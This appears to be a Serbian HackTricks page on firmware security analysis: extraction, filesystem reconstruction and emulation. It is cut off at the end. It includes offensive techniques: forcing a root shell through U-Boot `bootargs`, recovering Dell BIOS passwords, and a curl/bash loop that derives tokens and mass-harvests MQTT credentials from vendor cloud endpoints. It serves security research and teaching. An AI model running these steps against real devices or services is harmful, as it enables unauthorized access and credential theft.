# Analiza firmware-a

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

Za pribavljanje podataka preko izloženih hardverskih interfejsa pogledajte [dumpovanje firmware-a uz pomoć UART konzole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [dumpovanje SPI flash memorije](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Za ponovljivo UART snimanje tokom pokretanja uređaja, pre pristupa konzoli, pogledajte [akviziciju napajanja i osciloskopa kontrolisanu putem SCPI-ja](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je ključan softver koji omogućava ispravan rad uređaja tako što upravlja komunikacijom između hardverskih komponenti i softvera s kojim korisnici rade i omogućava je. Čuva se u trajnoj memoriji, pa uređaj može da pristupi važnim instrukcijama čim se uključi, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno izmenjivanje firmware-a ključan je korak u identifikovanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Pojedinostima o bootloader-u
- Hardverskom rasporedu i tehničkoj dokumentaciji
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i identifikovanim ranjivostima

U tu svrhu su alati za **open-source intelligence (OSINT)** neprocenjivi, kao i analiza svih dostupnih komponenti open-source softvera putem ručnih i automatizovanih pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) pružaju besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Pribavljanje firmware-a**

Firmware se može pribaviti na više načina, od kojih svaki ima različit nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** prema priloženim uputstvima
- **Preuzimanjem** sa zvaničnih stranica za podršku
- Korišćenjem Google dork upita za pronalaženje hostovanih firmware datoteka
- Direktnim pristupom **cloud skladištu**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Izdvajanjem** sa uređaja preko veza kao što su **UART**, **JTAG** ili **PICit**
- **Njuškanjem** zahteva za ažuriranje u komunikaciji uređaja
- Identifikovanjem i korišćenjem **hardkodiranih krajnjih tačaka za ažuriranje**
- **Dumpovanjem** iz bootloader-a ili preko mreže
- **Uklanjanjem i čitanjem** čipa za skladištenje, kada ništa drugo ne uspe, pomoću odgovarajućih hardverskih alata

### Samo UART logovi: prinudno pokretanje root shell-a preko U-Boot okruženja u flash memoriji

Ako se UART RX zanemaruje (dostupni su samo logovi), i dalje možete da pokrenete init shell tako što ćete **izmeniti U-Boot environment blob** van mreže:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo flešujte samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima na kojima je shell bootloader-a onemogućen, ali je env particija upisiva pomoću spoljnog pristupa flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izdvojite informacije kako biste znali kako da postupite. Za to možete da koristite različite alate:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađeš mnogo toga, proveri **entropiju** slike pomoću `binwalk -E <bin>`; ako je entropija niska, verovatno nije šifrovana. Ako je entropija visoka, verovatno je šifrovana (ili komprimovana na neki način).

Pored toga, pomoću ovih alata možeš da izdvojiš **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili pomoću [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pregledaš datoteku.

### Sirovi resursi za ekran u eksternoj fleš memoriji

Eksterni SPI dump nije nužno izvršni firmware MCU-a. Za Cortex-M uređaj, uporedi početak svakog kandidata za region koda sa memorijskom mapom uređaja: uobičajena tabela vektora počinje verovatnom adresom steka u SRAM-u i adresom reset-handlera u izvršnoj memoriji. Ako na pomeraju nula nema tabele vektora, to samo po sebi ne dokazuje da ceo čip nema kod; pregledaj i druge pomeraje i način pokretanja. Ako `binwalk` ne pronađe kontejner, pregledaj sirove bajtove i poveži adrese čitanja iz fleš memorije iz [dekodiranog SPI snimka](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) sa radnjama koje učitavaju nove ekrane.<sup>[[14]](#references)</sup>

Za region sa resursima ekrana, isprobaj moguće formate piksela i dimenzije umesto da pretpostaviš da su u pitanju PNG/JPEG. Na citiranom uređaju korišćeni su kadrovi formata **80×160 RGB565 little-endian**: pri dva bajta po pikselu, jedan kadar zauzima **25,600 bajtova** (25 KiB), a ne 24 kilobita. Adresa čitanja iz fleš memorije, nakon dekodiranja, otkrila je pomeraj resursa ekrana; istraživač je konvertovao pripremljenu sliku pomoću `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zamenio resurs iste veličine u originalnom dump-u, upisao ga pomoću `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potvrdio da se nova slika prikazuje na ekranu. Ovo pokazuje da su *eksterni resursi ekrana* upisivi, a ne da je MCU-ov interni firmware izdvojen ili ponovo upisan. Sačuvaj originalni dump i proveri dimenzije, redosled bajtova, pomeraj i dužinu zamene pre bilo kakvog upisa.<sup>[[14]](#references)</sup>

### Diferencijalna analiza fleš memorije i povratne XOR tajne iz skladišta

Kada format skladištenja neke postavke firmware-a nije dokumentovan, prvo obavi nekoliko čitanja iste fleš memorije, promeni **tačno jednu** postavku, ponovo dump-uj ceo čip i uporedi pomeraje. Ponavljanjem eksperimenta sa kontrolisanim vrednostima možeš da razlikuješ postavku od brojača i metapodataka upisa; promene na novim pomerajima, umesto na istom mestu, ukazuju na append-only ili log-structured skladište. Sačuvaj obrisane/tombstone unose, jer njihovi bajtovi podataka možda još mogu da se povrate.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon što pronađete region, izdvojite module firmvera pomoću alata kao što je `binwalk` i izvršite reverzni inženjering funkcija za upisivanje/proveru u Ghidra-i. U kodu potvrdite granice polja, padding, indeksiranje ključa i izvođenje ključa, umesto da šemu zaključujete samo na osnovu obrazaca šifrovanog teksta.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovanog paddinga sastavljenog od nula

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine posebno je izloženo kada njegov padding sastavljen od nula obuhvata sve indekse ponavljajućeg XOR ključa: šifrovani padding direktno otkriva te bajtove ključa jer je `0x00 XOR key_byte = key_byte`. Ako su pokriveni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifroteksta i dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Ranljivi Dell DVAR format BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je otvoreni tekst, dok se za bajtove `1..31` koristi ponavljajući ključ od 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nula pre XOR operacije. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, tako da se ceo ključ i lozinka mogu oporaviti bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Preuzimanje ključeva iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini unos koji zavisi od lozinke jeste njen prvi bajt u čistom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele ključ. Grupisanje aktivnih i obrisanih zapisa prema tom bajtu može otkriti ceo ključ iz kratkog istorijskog zapisa zahvaljujući paddingu, pa njime dešifrovati aktuelni duži zapis čiji padding sam po sebi nije dovoljan. Rotacija lozinke zato može povećati izloženost ako se stari šifrat označi kao obrisan umesto da se izbriše.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove bajtove sačuvane vrednosti/ključa. Napravite ga iz checkout-a i skenirajte proverenu flash sliku na sledeći način:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parsere odbacite lažno pozitivne rezultate proverom strukture zapisa, ograničenja za štampive znakove, dopune nulama, entropije ključa i doslednosti na mestu gde se ključ ponavlja. Ako ponovljeni dump-ovi pokazuju retke promene bitova pri svakom upisu, navedite uočene maske i rangirajte moguće ispravke na osnovu ovih ograničenja, ali prijavite dvosmislene znakove umesto da heuristički rezultat predstavite kao tačno izdvajanje.<sup>[[12]](#references)</sup>

Provere lozinki treba da čuvaju usoljeni, iterirani jednosmerni hash, a ne reverzibilni šifrat, dok skladišta sa log-strukturom treba bezbedno da uklanjaju zastareli tajni materijal.<sup>[[12]](#references)</sup>

### Dobavljanje fajl sistema

Uz prethodno navedene komentarisane alate, kao što je `binwalk -ev <bin>`, trebalo je da možete da **izdvojite fajl sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu po tipu fajl sistema**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl sistema

Ponekad binwalk **nema magični bajt fajl sistema među svojim potpisima**. U tim slučajevima, upotrebite binwalk da **pronađete pomeraj fajl sistema i izdvojite kompresovani fajl sistem** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu sa njegovim tipom, prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** da biste izdvojili Squashfs sistem datoteka.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u primeru iznad)

`$ unsquashfs dir.squashfs`

Datoteke će se zatim nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND fleš memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstrukcija podeljenih ugrađenih root sistema datoteka

Ako sirovi eMMC/SSD dump sadrži ispravno zaglavlje sistema datoteka, ali se pomeraji metapodataka protežu izvan nominalne particije, nemojte ga odmah klasifikovati kao oštećen. Ugrađeni kod za pokretanje može da sastavi stvarni root uređaj iz više fizičkih opsega pomoću Device Mapper-a, pa izdvajanje podataka iz jedne GPT particije daje samo prvi segment.<sup>[[9]](#references)</sup>

#### Početna provera kompletne slike medija

Najpre proverite da li je prikupljanje podataka završeno, da li je veličina stabilna i da li neki proces još uvek upisuje u sliku. Ako naziv datoteke sadrži početnu/završnu adresu, uporedite taj opseg sa stvarnim brojem bajtova. Oporavite GPT u režimu samo za čitanje i prikačite samo potreban opseg; **nemojte** pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici, jer su mogući sukobi grupa volumena i nenamerna upisivanja.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferirajte privremenu VM kada originalna init logika ili LVM stek moraju da vide celu sliku. Istorijski boot logovi sa standardne boot particije posebno su korisni: bootloader je možda zabeležio ofsete vlasničkog kontejnera, dužine komponenti, izbor slota, pravila poravnanja i verifikaciju potpisa. Iskoristite te vrednosti da izdvojite ugrađenu komandnu liniju, kernel i initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, magic bytes i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Oporavite mapu blokova pri pokretanju

Izdvojite initramfs kernela i izvršite reverse engineering njegovog `/init` fajla i svih biblioteka za skladištenje. U [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), pratite reference stringova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i pravi tabelu. Korisne početne tačke za radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linearni target mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više pozadinskih uređaja. Ovakav oblik je čest kod oporavljene tabele sa dva segmenta (sve pozicije i dužine izražene su u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Tačno reprodukujte aritmetiku mašinskog koda, uključujući širinu celih brojeva, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže na granicu od 4 KiB i tek zatim je konvertuje u sektore od 512 bajtova; ako ga zamenite izrazom `p4_bytes // 512`, izabrani završni deo se pomera za `p4_bytes % 4096` kad god particija nije poravnata na granicu stranice.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstrušite ravnu sliku za analizu kopiranjem opsega redosledom iz tabele, u ograničenim blokovima, umesto učitavanja celog dumpa medija u memoriju. Time se izbegava i kreiranje host-side mapper uređaja. Offsete izvedene iz GPT-a, obrnute brojeve sektora i dužinu rezultujućeg izlaza proverite odvojenim asercijama.<sup>[[9]](#references)</sup>

#### Razlikovanje oštećenja od konstantne greške pri rekonstrukciji

Za SquashFS proverite magic `hsqs` i dekodirajte 64-bitno polje `bytes_used` u little-endian formatu, na offsetu 40 superbloka, pre pokretanja `unsquashfs`. Ako izdvajanje ne uspe u nekoliko nepovezanih struktura, pretražite širok opseg oko očekivanih pozicija i zahtevajte jake strukturne kandidate: dekompresibilan blok metapodataka, nekoliko uzastopnih ispravnih unosa direktorijuma, uverljiva polja inode-a, korenski inode usklađen sa brojem inode-ova ili ispravnu strukturu metapodataka integriteta. Jedno poklapanje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada ista potpisana delta učini nezavisne strukture ispravnim — na primer, metapodatke direktorijuma i verity zapis — verovatni uzrok je sistematska greška u početku segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na granicu sektora/stranice pre nego što pokušate oporavak orphan podataka ili zakrpljivanje metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, držite granice zaštite odvojeno: LUKS volumeni čiji je ključ zapečaćen TPM-om štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet korenskog sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen originalnim fizičkim TPM-om, a pokretanje izmenjenog SquashFS-a pomoću init-a namenjenog samo istraživanju, koji izostavlja verifikaciju verity-ja, ne falsifikuje njegov potpis niti narušava dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmvera

Kada se firmver pribavi, neophodno je analizirati ga kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva upotrebu različitih alata za analizu i izdvajanje korisnih podataka iz slike firmvera.

### Alati za početnu analizu

Dostupan je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemima datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenio status šifrovanja slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo šifrovanja, dok visoka entropija može ukazivati na šifrovanje ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje fajl sistema

Pomoću `binwalk -ev <bin>` obično se može izdvojiti fajl sistem, često u direktorijum nazvan po tipu fajl sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl sistema zbog nedostajućih magičnih bajtova, potrebno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` za pronalaženje pomeraja fajl sistema, a zatim komande `dd` za izdvajanje fajl sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa fajl sistema (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Kada se fajl sistem izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se obraća na nebezbedne mrežne demone, hardkodirane akreditive, API endpoint-e, funkcionalnosti servera za ažuriranje, nekompilirani kod, skripte za pokretanje i kompajlirane binarne datoteke za offline analizu.

**Važne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** radi pronalaženja akreditiva korisnika
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke u potrazi za potencijalnim ranjivostima
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene web servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u pronalaženju osetljivih informacija i ranjivosti u fajl sistemu:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Provere bezbednosti kompajliranih binarnih datoteka

I izvorni kod i kompajlirane binarne datoteke pronađene u fajl sistemu moraju se pažljivo pregledati u potrazi za ranjivostima. Alati kao što su **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u identifikovanju nezaštićenih binarnih datoteka koje bi mogle biti zloupotrebljene.

## Prikupljanje cloud konfiguracije i MQTT akreditiva putem URL tokena izvedenih iz podataka

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodirane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i prikazuje se kao velika heksadecimalna slova

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u čistom tekstu i prefikse tema.

Praktični postupak:

1) Izdvojite deviceId iz UART logova pri pokretanju

- Povežite 3.3V UART adapter (TX/RX/GND) i snimite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a za cloud config i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i potražite putanju config fajla ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izračunajte token u Bash-u i pretvorite digest u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT kredencijale

- Sastavite URL i preuzmite JSON pomoću curl-a; parsirajte ga pomoću jq-ja da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba plaintext MQTT-a i slabih topic ACL-ova (ako postoje)

- Koristite pronađene akreditive da biste se pretplatili na teme za održavanje i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Nabrojte predvidljive ID-jeve uređaja (u velikom obimu, uz ovlašćenje)

- Mnogi ekosistemi u svoje ID-jeve ugrađuju OUI/proizvodne/tipske bajtove, a zatim sekvencijalni sufiks.
- Možete programski prolaziti kroz moguće ID-jeve, izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Napomene
- Uvek pribavite izričito ovlašćenje pre pokušaja masovnog enumerisanja.
- Kad god je moguće, prednost dajte emulaciji ili statičkoj analizi za otkrivanje tajni, bez menjanja ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prenos root filesystem-a ili određenih binarnih datoteka na uređaj odgovarajuće arhitekture i redosleda bajtova, kao što je Raspberry Pi, ili u unapred pripremljenu virtuelnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Pri analizi pojedinačnih programa ključno je utvrditi redosled bajtova i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

I za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući proces i pomažući u dinamičkoj analizi.

### Rekonstrukcija podeljenih i verifikovanih root fajl sistema za emulaciju

Ako je SquashFS superblock čitljiv, ali su pomeraji inode-a, direktorijuma ili fragment table nemogući, nemojte odmah da menjate `unsquashfs`. Obrnutim inženjeringom analizirajte rani boot binary i reprodukujte graf blokovskih uređaja koji on kreira: ugrađeni sistemi mogu da izlože nominalnu root particiju, ali da stvarni fajl sistem naprave pomoću `dm-linear` mapiranja koje dodaje sektore pozajmljene sa druge particije. Provere koje obuhvataju samo superblock mogu da uspeju iako su svi naredni blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Sačuvajte aritmetiku firmware-a tačno. Naročito utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja bitova i skraćivanje prvobitnim redosledom; i uzmite u obzir završne oblasti koje zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre skraćuje na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena sa `partition_bytes // 512` može da pomeri dodati opseg za nekoliko kilobajta i ošteti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Korisni postupak validacije je:<sup>[[11]](#references)</sup>

1. Iz verifier/init binarne datoteke utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite ili mapirajte opsege bez menjanja semantike njihovog poravnanja.
3. Ako ekstrakcija i dalje ne uspeva, pretražite samo mali opseg oko predviđene granice i zahtevajte nekoliko uzastopnih važećih struktura metapodataka, umesto da prihvatite samo uverljiv superblock.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešan prolazak kroz sve direktorijume i fragmente jači je dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene zamenom vendorovog verification PID 1 malim statički linkovanim init-om. Ovo je **zamena boot-chain-a u laboratorijskom okruženju**, a ne zaobilaženje dm-verity-ja, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog TPM-om.<sup>[[11]](#references)</sup>

Zamenski init treba da preslika operativne delove prvobitnog boot postupka: mount-uje `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima fajlova 0–2, mount-uje `/proc` i `/sys`, sačeka da dostavljeni blokovski uređaj bude dostupan, mount-uje izmenjeni root samo za čitanje, detach-uje pseudo-fajl sisteme starog root-a, premesti novi mount na `/`, izvrši `chroot` i pokrene originalni `/sbin/init` firmware-a pomoću `execve()`. Detach-ovanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno detach-ovanje tačaka mount-a koje pripadaju novom root-u.<sup>[[11]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtio disk montiran samo za čitanje obezbeđuje izmenjeni SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugging stanja slike van mreže

Pregledajte trajno stanje izvan guest-a kada sporo pokretanje sistema, destruktivne skripte pri pokretanju ili nepouzdano logovanje konzole otežavaju utvrđivanje uzroka greške. Nikada ne priključujte overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite LVM otkrivanje na predviđenu NBD particiju i deaktivirajte grupu volumena pre nego što je isključite.<sup>[[11]](#references)</sup>

```bash
